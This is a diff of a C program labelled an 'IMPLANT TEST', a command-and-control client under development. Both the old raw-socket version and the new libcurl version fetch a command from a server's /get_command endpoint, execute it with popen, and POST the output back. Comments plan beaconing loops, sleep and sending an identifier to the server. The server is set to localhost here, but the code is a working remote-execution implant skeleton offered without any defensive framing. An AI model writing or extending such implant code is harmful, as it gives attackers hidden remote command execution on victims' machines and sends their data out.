@@ -1,231 +1,160 @@
 #include <stdio.h>
 #include <string.h>
-#include <arpa/inet.h>
-#include <sys/socket.h>
+#include <curl/curl.h>
 #include <unistd.h>
 #include <stdlib.h>
-#include <ctype.h>
+
+// FIX CHECK TO SEE IF COMMAND IS EMPTY
+// ADD LOOP, SLEEP ECT
+// ADD FEATURE TO CHECK IF THIS IS FIRST TIME RUNNING
+// ADD FEATURE TO SEND IDENTIFIER TO SERVER
+
 
 #define BUFFER_SIZE 4096
 
-// Function To Remove New Line characters, 
-void trim_trailing_newlines(char *str) {
-    size_t len = strlen(str);
-    while (len > 0 && (str[len - 1] == '\n' || str[len - 1] == '\r')) {
-        str[--len] = '\0';  // Remove the trailing newline
+struct memory {
+    char *response;
+    size_t size;
+};
+
+
+// Function Lcurl Will Use save data (stolen straight from Libcurl Docs)
+static size_t cb(char *data, size_t size, size_t nmemb, void *clientp) {
+    size_t realsize = size * nmemb;
+    struct memory *mem = (struct memory *)clientp;
+
+    // Reallocate memory for the response
+    char *ptr = realloc(mem->response, mem->size + realsize + 1);
+    if (!ptr) {
+        return 0;  /* Out of memory! */
     }
+
+    mem->response = ptr;
+    memcpy(&(mem->response[mem->size]), data, realsize);
+    mem->size += realsize;
+    mem->response[mem->size] = 0;
+
+    return realsize;
 }
 
-
-// Function To URL Encode a string for sending with POST Request
-char* url_encode(const char *str) {
-    // Get Input String Length
-    size_t len = strlen(str);
-    // Create a Buffer For Our Encoded String
-    char *encoded = malloc(len * 3 + 1); // Doing * 3 as a string may have all %xx
-    if (!encoded) {
-        perror("malloc");
-        exit(EXIT_FAILURE);
+char* get_command(char* url) {
+	CURL *curl;
+	CURLcode res;
+	char* command_to_run = malloc(1);
+	struct memory chunk = {0};
+	if (command_to_run == NULL) {
+       fprintf(stderr, "Failed to allocate memory\n");
+       return NULL;
     }
 
-    char *ptr = encoded;
+    chunk.size = 0;
 
-    // Loop Through String To Check Each Character And If it needs to be encoded
-    for (size_t i = 0; i < len; ++i) {
-        // Type Cast Current Character To an Unsigned Int
-        unsigned char c = (unsigned char)str[i];
-        // Quick Check to see if its a alphanumeric character or is a safe char to use
-        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
-            // update pointer if so
-            *ptr++ = c;
-        } else {
-            // else we convert the character to its hex value (e.g / to %2f)
-            ptr += sprintf(ptr, "%%%02X", c);
+	curl_global_init(CURL_GLOBAL_DEFAULT);
+	curl = curl_easy_init();
+
+	command_to_run[0] = '\0';
+
+	if(curl) {
+		curl_easy_setopt(curl, CURLOPT_URL, url);
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, cb);
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);
+		res = curl_easy_perform(curl);
+
+		if (res != CURLE_OK) {
+            fprintf(stderr, "Request failed: %s\n", curl_easy_strerror(res));
+            free(command_to_run);
+            command_to_run = NULL;
         }
-    }
-    // Finally Return the encoded String
-    return encoded;
+
+		curl_easy_cleanup(curl);
+	}
+
+	curl_global_cleanup();
+
+	return chunk.response;
 }
 
+int send_command(char* data, char* url) {
+	CURL* curl;
+	CURLcode res;
+	char send_data[BUFFER_SIZE];
 
+	// Create the POST Body (output=zevuxo)
+	snprintf(send_data, sizeof(send_data), "output=%s", data);
+	printf("%s\n", send_data);
 
+	curl_global_init(CURL_GLOBAL_DEFAULT);
+	curl = curl_easy_init();
 
-char* get_command(const char* ip, int port, int sockFD) {
-  // Buffers For Headers Reponse ect
-	char headers[BUFFER_SIZE];
-	char response[BUFFER_SIZE];
-	int bytes_read;
+	if(curl) {
+		printf("Preparing To Send POST Request\n");
+		curl_easy_setopt(curl, CURLOPT_URL, url);
+		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, send_data);
 
-  // Copy the required Headers into the buffer
-	snprintf(headers, sizeof(headers), "GET /get_command HTTP/1.1\r\n"
-									"Host: %s:%d\r\n"
-									"Connection: keep-alive\r\n\r\n", ip, port);
+		res = curl_easy_perform(curl);
 
-  // Send GET Request to the server to grab the command-to-run page
-	int bytes_sent = send(sockFD, headers, strlen(headers), 0);
-	if (bytes_sent <= 0) {
-		printf("Failed Sending GET request\n");
-		return NULL;
-	}
-
-  // Recv Reponse From Server
-	bytes_read = recv(sockFD, response, sizeof(response), 0);
-	if (bytes_read <= 0) {
-		fprintf(stderr, "Failed Reading Response");
-		return NULL;
-	}
-  // Null terminate the reponse
-	response[bytes_read] = '\0';
-
-  // Vars Used For pasring the html to find command
-	char* start_tag = "<command>";
-	char* end_tag = "</command>";
-
-	char* start = strstr(response, start_tag);
-	char* end = strstr(response, end_tag);
-
-  
-	if(start && end && start < end) {
-		start += strlen(start_tag);
-		size_t com_len = end - start;
-		char* command = malloc(com_len + 1);
-		if (command == NULL) {
-			fprintf(stderr, "Malloc Failed\n");
-			return NULL;
+		if(res != CURLE_OK) {
+			fprintf(stderr, "POST FAILED");
+			curl_easy_cleanup(curl);
+			return 0;
 		}
 
-    // Copy the command into a buffer for returning, 
-		strncpy(command, start, com_len);
-    // null terminate that shit again
-		command[com_len] = '\0';
-    // Finally Return it
-		return command;
-	} else {
-		fprintf(stderr, "Command Not Found\n");
+	}
+
+	curl_global_cleanup();
+	return 0;
+}	
+
+
+char* run_command(char* command, char* output) {
+	FILE* f;
+	char buffer[BUFFER_SIZE];
+	size_t len = 0;
+
+	output[0] = '\0';
+
+	f = popen(command, "r");
+
+	if (f == NULL) {
+		fprintf(stderr, "popen Failed\n");
 		return NULL;
 	}
 
-}
-
-// Stupid Fucking Function, the server just refuses to acknowledge this Post Request
-// Wireshark captures it succesfully but the server just doesnt do shit
-// need to test more
-int send_output(int sockFD, const char* command, const char* ip, int portNo) {
-	char headers[BUFFER_SIZE] = { 0 };
-	char command_buffer[BUFFER_SIZE] = { 0 };
-	char fullout[BUFFER_SIZE] = { 0 };
-	FILE *f;
-
-
-  // Run command that we got from the GET Request
-	f = popen(command, "r");
-
-  // Read and store the output (no shit)
-	while(fgets(command_buffer, BUFFER_SIZE, f) != NULL) {
-		strncat(fullout, command_buffer, sizeof(fullout) - strlen(fullout) - 1);
+	while(fgets(buffer, sizeof(buffer), f) != NULL) {
+		if(len + strlen(buffer) < BUFFER_SIZE - 1) {
+			strcat(output, buffer);
+			len += strlen(buffer);
+		}else {
+			fprintf(stderr, "Buffer Will OverFlow");
+			return NULL;
+		}
+		
 	}
 	pclose(f);
-  // Remove \n && \0
-	trim_trailing_newlines(fullout);
-  // encode that shit
-	char* encoded = url_encode(fullout);
-	printf("%s\n", encoded);
 
-  // determine the content-lenght value
-	size_t content_length = strlen("output=") + strlen(encoded);
-
-
-  // Create The Headers(Swear this shit is right server is just refusing it)
-	snprintf(headers, sizeof(headers), 
-	         "POST /send_output HTTP/1.1\r\n"
-	         "Host: %s:%d\r\n"
-	         "Content-Type: application/x-www-form-urlencoded\r\n"
-	         "Content-Length: %d\r\n"
-	         "Connection: keep-alive\r\n\r\n"
-	         "output=%s", 
-	         ip, portNo, content_length, encoded);
-
-	printf("HEADERS\n%s\n", headers);
-
-
-	ssize_t total_size = strlen(headers);
-	ssize_t bytes_sent = 0;
-
-  // Finally Send the command Output Back to the server
-	while (bytes_sent < total_size) {
-        ssize_t result = send(sockFD, headers + bytes_sent, total_size - bytes_sent, 0);
-        if (result < 0) {
-            perror("send");
-            return 0;
-        }
-        bytes_sent += result;
-    }
-
-  // Debug shit
-	printf("total: %zu\nsent: %zu\n", total_size, bytes_sent);
-
-
-	//printf("Sent %d Bytes\n", bytes_sent);
-
-	return 1;
 }
 
 
-int main(int argc, char *argv[])
-{
-	int server_fd, opt = 1;
-	struct sockaddr_in server;
-	char buffer[BUFFER_SIZE] = { 0 };
-	char command_buffer[BUFFER_SIZE] = { 0 };
-	char *ip = argv[1];
-	int portNo = atoi(argv[2]);
-	char* command;
+int main(int argc, char* argv[]){
+	printf("IMPLANT TEST\n");
+	char command[BUFFER_SIZE];
+	char output[BUFFER_SIZE];
 
-	socklen_t serverSize = sizeof(server);
-	//socklen_t clientSize = sizeof(client);
+	printf("Getting Command To Run...\n");
+	char* command_to_run = get_command("http://127.0.0.1/get_command");
 
-  // Create TCP Socket
-	if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-		fprintf(stderr, "Socket Creation Failed\n");
+	if(command_to_run == NULL || strcmp(command_to_run, "Nope") == 0) {
+		fprintf(stderr, "Failed To Get Command...");
 		return 1;
 	}
+	
+	printf("%s\n", command_to_run);
 
-  // set up values for struct
-	server.sin_family = AF_INET;
-	server.sin_port = htons(portNo);
-  // Convert IP To Network Byte Order
-	if((inet_pton(AF_INET, ip, &server.sin_addr.s_addr)) <= 0) {
-		fprintf(stderr, "Failed Converting IP\n");
-		return 1;
-	}
-
-  // Finally Connect to the server
-	if(connect(server_fd, (struct sockaddr*)&server, sizeof(server)) < 0) {
-		fprintf(stderr, "Failed Connecting");
-		return 1;
-	}
-
-  // Connect to Server And Get Command (changing this to loop and then sleep if no command found)
-	command = get_command(ip, portNo, server_fd);
-
-	if(!command) {
-		printf("Couldnt Grab Command");
-		return 1;
-	}
-
-	printf("Command To Run: %s\n", command);
-	sleep(2);
-
-  // Finally Send the output, to bad this shit isnt working
-	int check = send_output(server_fd, command, ip, portNo);
-
-
-	if(!check) {
-		printf("FAIL");
-
-	}
-
-
+	run_command(command_to_run, output);
+	printf("%s\n", output);
+	
+	send_command(output, "http://127.0.0.1/send_command");
+	
 
 	return 0;
 }
